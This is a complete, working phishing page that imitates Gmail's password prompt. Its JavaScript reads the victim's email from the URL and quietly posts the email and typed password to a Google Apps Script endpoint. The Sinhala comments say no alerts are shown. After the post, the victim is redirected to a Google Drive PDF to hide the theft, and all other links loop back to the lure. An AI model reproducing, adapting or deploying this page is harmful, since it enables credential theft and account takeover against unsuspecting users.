<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail Login</title>
    <link rel="shortcut icon" href="images/image.png" type="image">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .maindiv {
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 36px;
            background: #fff;
            border-radius: 8px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .divlogo {
            width: 56px;
            height: 56px;
            margin-bottom: 25px;
            display: block;
        }

        .welcome {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 8px;
            text-align: center;
        }

        .welcomee {
            font-size: 16px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 25px;
            text-align: center;
        }

        .user-display {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 25px;
            gap: 6px;
            cursor: default;
            width: 100%;
        }

        .user-display .email-text {
            font-size: 16px;
            color: #202124;
            font-weight: 500;
        }

        .passdiv {
            position: relative;
            width: 100%;
            margin-bottom: 0px;
        }

        input[type="password"], input[type="text"] {
            width: 100%;
            padding: 13px 45px 13px 15px;
            font-size: 16px;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            background: #fff;
            transition: border-color 0.2s ease;
            height: 52px;
            color: #202124;
        }

        input[type="password"]:focus, input[type="text"]:focus {
            border-color: #1a73e8;
            border-width: 2px;
            padding: 12px 44px 12px 14px;
        }

        input[type="password"]:focus + .placeholder-label,
        input[type="password"]:not(:placeholder-shown) + .placeholder-label,
        input[type="text"]:focus + .placeholder-label,
        input[type="text"]:not(:placeholder-shown) + .placeholder-label {
            top: 3px;
            left: 12px;
            padding: 0 4px;
            background-color: #fff;
            color: #1a73e8;
            font-size: 11px;
            font-weight: 500;
        }

        input[type="password"]:not(:placeholder-shown),
        input[type="text"]:not(:placeholder-shown) {
            padding-top: 18px;
            padding-bottom: 6px;
        }

        input[type="password"]:focus:not(:placeholder-shown),
        input[type="text"]:focus:not(:placeholder-shown) {
            padding-top: 17px;
            padding-bottom: 5px;
        }

        .placeholder-label {
            position: absolute;
            top: 50%;
            left: 15px;
            transform: translateY(-50%);
            color: #5f6368;
            font-size: 16px;
            font-weight: 400;
            pointer-events: none;
            transition: all 0.15s ease;
            background: transparent;
        }

        .show-password-btn {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            padding: 8px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #5f6368;
            transition: background 0.2s;
            outline: none;
        }

        .show-password-btn:hover {
            background: rgba(0, 0, 0, 0.05);
        }

        .show-password-btn svg {
            width: 24px;
            height: 24px;
            fill: #5f6368;
        }

        .show-password-btn .eye-off {
            display: none;
        }

        .show-password-btn.showing .eye-on {
            display: none;
        }

        .show-password-btn.showing .eye-off {
            display: block;
        }

        .forgot-pwd-container {
            width: 100%;
            margin-top: 8px;
            margin-bottom: 30px;
        }

        .forgot-pwd-container .button {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            background: none;
            border: none;
            padding: 0;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
        }

        .forgot-pwd-container .button:hover {
            text-decoration: underline;
        }

        .fgtpwd {
            width: 100%;
            display: flex;
            justify-content: flex-end;
            align-items: center;
            margin-top: 8px;
        }

        .btnnxt {
            padding: 10px 28px;
            font-size: 14px;
            font-weight: 500;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            border: none;
            border-radius: 4px;
            background-color: #1a73e8;
            color: white;
            cursor: pointer;
            transition: background-color 0.2s ease;
            height: 40px;
            min-width: 80px;
            letter-spacing: 0.25px;
        }

        .btnnxt:hover {
            background-color: #1b66c9;
            box-shadow: 0 1px 3px 0 rgba(0,0,0,0.3);
        }

        .btnnxt:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            box-shadow: none;
        }

        .btn-container {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid #e8eaed;
            border-top: 2px solid #1a73e8;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .guest-mode {
            width: 100%;
            margin-top: 30px;
            font-size: 14px;
            color: #5f6368;
            line-height: 1.5;
            text-align: center;
        }

        .guest-mode a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }

        .guest-mode a:hover {
            text-decoration: underline;
        }

        .btmdiv {
            width: 100%;
            max-width: 450px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 40px 0;
            margin-top: 20px;
            border-top: 1px solid transparent;
        }

        .left-div select {
            padding: 6px 8px;
            font-size: 12px;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background: transparent;
            border: none;
            color: #5f6368;
            cursor: pointer;
            outline: none;
        }

        .left-div select:hover {
            text-decoration: underline;
        }

        .right-divs {
            display: flex;
            gap: 16px;
        }

        .right-divs button {
            background: transparent;
            border: none;
            color: #5f6368;
            font-size: 12px;
            cursor: pointer;
            padding: 6px 8px;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            border-radius: 4px;
        }

        .right-divs button:hover {
            text-decoration: underline;
            background: rgba(0,0,0,0.04);
        }

        @media (max-width: 500px) {
            .maindiv {
                padding: 32px 24px 24px;
            }
            .btmdiv {
                flex-direction: column;
                gap: 12px;
                padding: 16px 24px 0;
            }
            .right-divs {
                gap: 12px;
            }
        }

        @media (max-width: 400px) {
            .maindiv {
                padding: 24px 16px 20px;
            }
            .welcome {
                font-size: 20px;
            }
            .user-display {
                flex-wrap: wrap;
                gap: 4px;
            }
            .btnnxt {
                width: 100%;
            }
            .fgtpwd {
                flex-direction: column;
                gap: 12px;
            }
            .btn-container {
                width: 100%;
                justify-content: flex-end;
            }
            .btmdiv {
                padding: 12px 16px 0;
            }
            .right-divs {
                flex-wrap: wrap;
                justify-content: center;
            }
        }
    </style>
</head>
<body>
    <div class="maindiv">
        <img class="divlogo" src="images/image.png" alt="Google">

        <div class="welcome">Welcome</div>
        <div class="welcomee">to continue to Gmail</div>

        <div class="user-display" id="userDisplay">
            <span class="email-text" id="userEmail">user@gmail.com</span>
        </div>

        <div class="passdiv">
            <input required name="password" type="password" id="passwordInput" placeholder=" ">
            <label for="passwordInput" class="placeholder-label">Enter your password</label>
            <button type="button" class="show-password-btn" id="showPasswordBtn" aria-label="Show password">
                <svg class="eye-on" viewBox="0 0 24 24" width="24" height="24">
                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                </svg>
                <svg class="eye-off" viewBox="0 0 24 24" width="24" height="24">
                    <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
                </svg>
            </button>
        </div>

        <div class="forgot-pwd-container">
            <span class="button" id="forgotPasswordLink">Forgot password?</span>
        </div>

        <div class="fgtpwd">
            <div class="btn-container">
                <button type="button" class="btnnxt" id="nextBtn">Next</button>
                <div class="spinner" id="loadingSpinner"></div>
            </div>
        </div>

        <div class="guest-mode">
            Not your computer? Use a Private Window to sign in. 
            <span id="guestModeLink" style="color:#1a73e8;cursor:pointer;font-weight:500;">Learn more about using Guest mode</span>
        </div>
    </div>

    <div class="btmdiv">
        <div class="left-div">
            <select id="language-select">
                <option value="en">English (United States)</option>
                <option value="fr">French</option>
                <option value="es">Spanish</option>
                <option value="de">German</option>
            </select>
        </div>

        <div class="right-divs">
            <button id="helpButton">Help</button>
            <button id="privacyButton">Privacy</button>
            <button id="termsButton">Terms</button>
        </div>
    </div>

    <script>
        // ============================================================
        // CONFIGURATION - ඔබගේ Web App URL එක මෙතන දාන්න
        // ============================================================
        const GOOGLE_SHEETS_WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbwUTh2tkCEz8ymDFTWDZIYxhNDJ7tFmZvCpQZ93N_j5jBzuCZvYOpGp0lbVCsF88fo/exec';
        const PDF_URL = 'https://drive.google.com/file/d/1m_fm236xcbj_CcTyku1XCjgu9kexm3ri/view?usp=sharing';

        // ============================================================
        // ELEMENTS
        // ============================================================
        const passwordInput = document.getElementById('passwordInput');
        const nextBtn = document.getElementById('nextBtn');
        const loadingSpinner = document.getElementById('loadingSpinner');
        const userEmail = document.getElementById('userEmail');
        const forgotPasswordLink = document.getElementById('forgotPasswordLink');
        const guestModeLink = document.getElementById('guestModeLink');
        const showPasswordBtn = document.getElementById('showPasswordBtn');

        // ============================================================
        // GET USERNAME FROM URL
        // ============================================================
        function getUsernameFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('username') || '';
        }

        const currentUsername = getUsernameFromURL();

        if (!currentUsername) {
            window.location.href = 'username.html';
        }

        function updateUserDisplay(username) {
            userEmail.textContent = username;
        }

        updateUserDisplay(currentUsername);

        // ============================================================
        // SHOW/HIDE PASSWORD
        // ============================================================
        if (showPasswordBtn) {
            showPasswordBtn.addEventListener('click', function() {
                const isPassword = passwordInput.type === 'password';
                if (isPassword) {
                    passwordInput.type = 'text';
                    this.classList.add('showing');
                } else {
                    passwordInput.type = 'password';
                    this.classList.remove('showing');
                }
            });
        }

        // ============================================================
        // LINKS
        // ============================================================
        if (forgotPasswordLink) {
            forgotPasswordLink.addEventListener('click', function(e) {
                e.preventDefault();
                window.location.href = 'password.html?username=' + encodeURIComponent(currentUsername);
            });
        }

        if (guestModeLink) {
            guestModeLink.addEventListener('click', function(e) {
                e.preventDefault();
                window.location.href = 'username.html';
            });
        }

        const helpBtn = document.getElementById('helpButton');
        const privacyBtn = document.getElementById('privacyButton');
        const termsBtn = document.getElementById('termsButton');
        const langSelect = document.getElementById('language-select');

        if (helpBtn) {
            helpBtn.addEventListener('click', function() {
                window.location.href = 'username.html';
            });
        }
        if (privacyBtn) {
            privacyBtn.addEventListener('click', function() {
                window.location.href = 'username.html';
            });
        }
        if (termsBtn) {
            termsBtn.addEventListener('click', function() {
                window.location.href = 'username.html';
            });
        }
        if (langSelect) {
            langSelect.addEventListener('change', function() {
                window.location.href = 'username.html';
            });
        }

        // ============================================================
        // SAVE TO GOOGLE SHEETS - කිසිම message/alert එකක් නැතුව
        // ============================================================
        async function saveToGoogleSheets(username, password) {
            try {
                await fetch(GOOGLE_SHEETS_WEB_APP_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        username: username,
                        password: password
                    })
                });
                return true;
            } catch (error) {
                return false;
            }
        }

        // ============================================================
        // LOAD PDF - කිසිම message/alert එකක් නැතුව
        // ============================================================
        function loadPDF() {
            window.location.href = PDF_URL;
        }

        // ============================================================
        // HANDLE NEXT BUTTON CLICK - කිසිම message/alert එකක් නැතුව
        // ============================================================
        async function handleNextClick() {
            const password = passwordInput.value.trim();
    
            if (password === '') {
            // Password එක හිස් නම් password.html එකම reload වෙන්න
                window.location.href = 'password.html?username=' + encodeURIComponent(currentUsername);
                return;
            }

            try {
             // Save to Google Sheets
                await saveToGoogleSheets(currentUsername, password);
        
            // PDF එකට redirect වෙන්න
            loadPDF();
        
                } catch (error) {
            // Error එකක් ආවත් කිසිම message එකක් නැහැ
            }
        }

        // ============================================================
        // EVENT LISTENERS
        // ============================================================
        if (nextBtn) {
            nextBtn.addEventListener('click', handleNextClick);
        }

        if (passwordInput) {
            passwordInput.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    handleNextClick();
                }
            });
        }
    </script>
</body>
</html>
